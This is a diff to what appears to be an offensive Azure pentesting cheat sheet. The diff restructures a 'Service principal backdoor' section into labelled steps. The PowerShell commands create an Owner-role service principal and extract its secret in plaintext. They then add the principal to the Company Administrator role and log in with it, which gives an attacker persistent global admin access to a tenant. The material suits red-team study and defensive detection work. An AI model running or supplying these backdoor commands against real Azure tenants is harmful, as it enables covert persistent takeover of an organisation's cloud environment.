@@ -7,16 +7,38 @@
 * [Service principal global admin](#Service-principal-global-admin)
 
 ## Service principal backdoor
+#### Create a new azure service principal
 ```
 $spn = New-AzAdServicePrincipal -DisplayName "WebService" -Role Owner
 $spn
+```
+
+#### Get service principal secret
+```
 $BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($spn.Secret)
 $UnsecureSecret = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)
 $UnsecureSecret
+```
+
+#### set service principal in variable and role
+```
 $sp = Get-MsolServicePrincipal -AppPrincipalId <AppID>
 $role = Get-MsolRole -RoleName "Company Administrator"
+```
+
+#### Create backdoor, Add service prinicpal as a role member
+```
 Add-MsolRoleMember -RoleObjectId $role.ObjectId -RoleMemberType ServicePrincipal -RoleMemberObjectId $sp.ObjectId
-#Enter the AppID as username and what was returned for $UnsecureSecret as the password in the Get-Credential prompt
+```
+
+#### List the members of the role
+```
+Get-MsolRoleMember -RoleObjectId $role.ObjectId
+```
+
+#### Login as service principal
+- Enter the AppID as username and what was returned for $UnsecureSecret as the password in the Get-Credential prompt
+```
 $cred = Get-Credential
 Connect-AzAccount -Credential $cred -Tenant “tenant ID" -ServicePrincipal
 ```
